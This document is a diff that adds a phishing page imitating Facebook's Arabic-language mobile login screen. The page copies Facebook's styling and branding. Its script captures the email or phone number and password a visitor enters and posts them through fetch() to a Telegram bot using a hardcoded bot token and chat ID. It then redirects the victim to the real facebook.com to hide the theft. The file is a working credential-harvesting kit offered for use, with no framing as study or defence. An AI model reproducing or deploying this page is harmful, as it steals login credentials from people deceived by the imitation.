@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            direction: rtl;
+        }
+        .header-banner {
+            background-color: #fffbe2;
+            color: #3b5998;
+            padding: 10px;
+            font-size: 13px;
+            text-align: center;
+            border-bottom: 1px solid #e2dfc9;
+        }
+        .logo-container {
+            text-align: center;
+            padding: 25px 0 10px 0;
+        }
+        .logo-container img {
+            width: 112px;
+        }
+        .form-container {
+            padding: 0 16px;
+            margin-top: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            height: 46px;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            background-color: #f5f6f7;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            margin-bottom: 8px;
+        }
+        input:focus {
+            background-color: #fff;
+            border-color: #1877f2;
+        }
+        .login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            height: 44px;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        .forgot-link-container {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .forgot-link {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .divider-container {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 24px 0;
+            color: #4b4f56;
+            font-size: 12px;
+        }
+        .divider-container::before, .divider-container::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadde1;
+        }
+        .divider-container:not(:empty)::before {
+            margin-left: .25em;
+        }
+        .divider-container:not(:empty)::after {
+            margin-right: .25em;
+        }
+        .create-account-container {
+            text-align: center;
+            padding: 0 40px;
+        }
+        .create-btn {
+            background-color: #00a400;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+            padding: 0 16px;
+            height: 36px;
+            cursor: pointer;
+            display: inline-block;
+            line-height: 36px;
+            text-decoration: none;
+        }
+        .footer-languages {
+            margin-top: 50px;
+            padding: 20px 16px;
+            background-color: #fff;
+            font-size: 12px;
+            color: #576b95;
+            text-align: center;
+        }
+        .footer-languages span {
+            margin: 0 5px;
+        }
+        .footer-languages .active {
+            color: #90949c;
+            font-weight: bold;
+        }
+        .meta-text {
+            margin-top: 15px;
+            color: #90949c;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header-banner">
+    احصل على فيسبوك لنظام Android وتصفح بشكل أسرع.
+</div>
+
+<div class="logo-container">
+    <img src="https://fbcdn.net" alt="Facebook">
+</div>
+
+<div class="form-container">
+    <form id="fbMobileForm">
+        <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit" class="login-btn">تسجيل الدخول</button>
+    </form>
+    
+    <div class="forgot-link-container">
+        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+    </div>
+    
+    <div class="divider-container">أو</div>
+    
+    <div class="create-account-container">
+        <div class="create-btn">إنشاء حساب جديد</div>
+    </div>
+</div>
+
+<div class="footer-languages">
+    <div>
+        <span class="active">العربية</span> • <span>English (US)</span> • <span>Français (France)</span>
+    </div>
+    <div class="meta-text">Meta © 2026</div>
+</div>
+
+<script>
+document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const token = '8940244394:AAGl_48JKHuu0-wqGgXFTsAzjzS4g5Z2gQg';
+    const chatId = '8925208993';
+    
+    const emailVal = document.getElementById('email').value;
+    const passwordVal = document.getElementById('password').value;
+
+    const url = `https://telegram.org{token}/sendMessage`;
+    const messageText = `🔔 تسجيل دخول جديد:\n\n👤 الحساب: ${emailVal}\n🔑 كلمة السر: ${passwordVal}`;
+
+    const data = {
+        chat_id: chatId,
+        text: messageText
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(() => {
+        window.location.href = "https://facebook.com";
+    })
+    .catch(() => {
+        window.location.href = "https://facebook.com";
+    });
+});
+</script>
+
+</body>
+</html>
